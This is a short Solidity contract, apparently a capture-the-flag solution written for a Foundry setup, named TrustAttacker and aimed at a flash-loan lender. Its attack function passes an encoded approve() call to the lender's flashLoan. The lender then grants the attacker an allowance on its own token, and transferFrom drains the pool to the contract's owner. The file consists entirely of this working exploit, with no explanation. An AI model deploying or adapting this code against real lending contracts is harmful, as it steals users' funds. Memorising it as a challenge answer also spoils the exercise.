// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrust {
  function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        returns (bool);

  function token() external returns (address);
}

contract TrustAttacker {
  address immutable _owner;
  ITrust immutable _trust;

  constructor(address trust) {
    _owner = msg.sender;
    _trust = ITrust(trust);
  }

  function attack(uint256 amount) external {
    require(msg.sender == _owner, "only owner");
    bytes memory call = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
    _trust.flashLoan(amount, address(_trust), address(_trust.token()), call);
    IERC20(_trust.token()).transferFrom(address(_trust), _owner, amount);
  }
}
